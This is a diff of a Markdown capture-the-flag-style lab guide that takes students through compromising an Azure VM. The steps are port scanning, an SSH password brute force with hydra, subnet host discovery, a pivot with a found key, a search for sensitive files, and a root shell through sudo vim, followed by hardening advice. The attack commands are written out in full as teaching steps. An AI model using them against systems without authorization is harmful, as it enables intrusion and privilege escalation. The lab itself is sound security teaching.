@@ -1,5 +1,8 @@
 # Lab 01: Compromised VM
 
+> [!WARNING]
+> **ETHICAL USE ONLY**: This lab is for educational purposes in a controlled environment. These techniques should NEVER be used against systems you don't own or don't have explicit permission to test. Unauthorized access to computer systems is illegal and unethical.
+
 ## Step 1: Connecting to the VM
 
 1. **Check for open ports**:
@@ -14,13 +17,13 @@
     **-Pn:** Skip ping sweep
 
 2. **Attempt SSH**:  
-    We see that port 22 is open, so Let’s start by trying to ssh into the VM:
+    We see that port 22 is open. This is the default port for SSH, so let’s start by trying to SSH into the VM:
 
     ```bash
     ssh azureuser@<Public_IP>
     ```
 
-    If it prompts for a password, this indicates that the VM is not using a     secure authentication method like SSH keys. Let's try to crack the  password.
+    If it prompts for a password, this indicates that the VM is not using a secure authentication method like SSH keys. Let's try to crack the password.
 
 ## Step 2: Crack the Password
 
@@ -30,15 +33,15 @@
    - If the machine is hosted on Azure, the default username is often `azureuser`, so let's try using that username first.
 
 2. **Brute Force the Password**:  
-   Tools like `hydra`, `ncrack`, and `medua` can be used for brute-forcing logins. Let's use `hydra` to perform our attack. We will need to provide a username and a list of passwords to try against. Let's try the 200 most common passwords of 2023 from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2023-200_most_used_passwords.txt):
+   Tools like `hydra`, `ncrack`, and `medusa` can be used for brute-forcing logins. Let's use `hydra` to perform our attack. We will need to provide a username and a list of passwords to try against. Let's try the 200 most common passwords of 2023 from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2023-200_most_used_passwords.txt):
 
    ```bash
-   hydra -l azureuser -P /path/to/common_passwords.txt ssh://<Public_IP>
+   hydra -l azureuser -P ./common_passwords.txt ssh://<Public_IP>
    ```
 
     > [!NOTE]
     **-l azureuser:** Specifies the username to use for the attack.  
-    **-P /path/to/common_passwords.txt:** Points to a file containing a     list of common passwords.  
+    **-P ./common_passwords.txt:** Points to a file containing a list of common passwords.  
     **ssh://<Public_IP>:** Specifies the method and IP address.
 
 ## Step 3: Access the VM
@@ -67,40 +70,44 @@ You’ll likely see an internal IP in the 10.0.0.x range (common for Azure VNets
 
 ### 4.2: Discover Other Devices on the Network
 
-We’ll ping all devices in the 10.0.0.x range to identify active hosts. We can use `fping` or `nmap` to send bulk ICMP echo probes (pings).
+We'll scan all devices in the 10.0.0.x range to identify active hosts. Use one of the methods below to send bulk ICMP echo probes (pings).
 
+**Method 1: Using nmap:**
+```bash
+nmap -sn 10.0.0.0/24
+```
+
+>[!NOTE]
+**-sn:** Ping scan only (no port scan) to discover live hosts.
+
+**Method 2: Using fping:**
 ```bash
 fping -g 10.0.0.1 10.0.0.254
 ```
 
 >[!NOTE]
-**-g:** Specifies the range of IPs to ping (e.g., 10.0.0.1 to 10.0.0.254).  
-**-a** Shows only reachable hosts.  
-**-q** Runs quietly (suppresses output except results).  
+**-g** : Generates a list of IPs in the specified range and pings them.
 
-or
+**Method 3: Use a simple bash loop:**
+```bash
+echo "Scanning network..."
+for i in {1..254}; do
+  (ping -c 1 -W 1 10.0.0.$i >/dev/null 2>&1 && echo "10.0.0.$i is up") &
+done | sort -V
+```
+
+### 4.3: Check ARP Cache (Optional)
+
+The methods above will output the devices that responded, but if you want to verify, use the ARP cache to find devices that responded:
 
 ```bash
-nmap -sS 10.0.0.1-254
+arp -a
 ```
 
 >[!NOTE]
-**-sS:** Performs a stealthy SYN scan to detect open ports.
+**-a:** Lists all entries in the ARP table.  
 
-### 4.3: Filter Active Devices
-
-The tools above will output the devices that responsed, but if you want to verify, use the ARP cache to find devices that responded:
-
-```bash
-arp -a | grep 10.0.0. | grep ether
-```
-
->[!NOTE]
-**arp -a:** Lists devices in the ARP cache.  
-**grep 10.0.0.:** Filters for devices on the 10.0.0.x subnet.  
-**grep ether:** Ensures only devices with MAC addresses are shown (ignoring unresolved pings).  
-
-## Step 5: Lateral Movement to Another VM
+## Step 5: Pivot to Another VM
 
 Hopefully you were able to find another vm on the network. Let's try to connect to it.
 
@@ -133,6 +140,48 @@ ssh -i path/to/key azureuser@<Internal_IP>
 
 ## Step 6: Explore the Second VM
 
+🎉 You're in! Time to explore this second VM:
+
+### 6.1: Basic System Information
+```bash
+# Check current user and privileges
+whoami
+id
+
+# Check system information
+uname -a
+cat /etc/os-release
+```
+
+### 6.2: Look for Sensitive Files
+```bash
+# Search for interesting files in common locations
+find /home -type f -name "*.txt" -o -name "*.log" -o -name "*.conf" 2>/dev/null
+ls -la ~/
+
+# Look for hidden files and directories
+ls -la /tmp/
+find . -name ".*" -type f 2>/dev/null
+```
+
+### 6.3: Check for Privilege Escalation Opportunities
+```bash
+# Check sudo privileges (most important!)
+sudo -l
+```
+
+> [!TIP]
+> **Common Privilege Escalation**: If `sudo -l` shows you can run commands as root without a password, you might be able to escalate privileges.
+
+> [!WARNING]
+> **Vim Privilege Escalation**: If you can run `vim` with sudo, you can escape to a root shell! Try:
+> ```bash
+> sudo vim /etc/passwd
+> # Then in vim, type: :!/bin/bash
+> # This gives you a root shell!
+> ```
+
+
 🎉 You’re in! Time to explore this second VM:
 
 - Look for sensitive files.
@@ -145,21 +194,26 @@ After completing the exercise, feel free to use the vulnerabilities you learned 
 
 Suggestions for improved security include:
 
-1. Use Strong Authentication:
+1. **Use Strong Authentication:**
    - Disable password-based SSH authentication and use key pairs instead.
    - Use a passphrase on top of your private keys.
 
-2. Restrict Network Access:
+2. **Fix Sudo Misconfigurations:**
+   - Remove overly permissive sudo rules that allow text editors or other dangerous programs.
+   - Use `sudo visudo` to safely edit sudoers files.
+   - Follow the principle of least privilege.
+
+3. **Restrict Network Access:**
     - Update NSG rules to allow SSH only from specific trusted IPs.
     - Remove any broad rules like Allow Any or unrestricted inbound access.
 
-3. Connect via Bastion
+4. **Connect via Bastion:**
     - If your vm does not require a public IP, delete the public IP and connect through Azure Bastion instead.
 
-4. Monitor and Audit Logs:
+5. **Monitor and Audit Logs:**
     - Enable logging for SSH access and network activities.
     - Use Azure Monitor and Security Center to detect unusual login attempts.
 
-5. Harden the VM:
+6. **Harden the VM:**
     - Apply least privilege principles.
     - Regularly update and patch the VM.
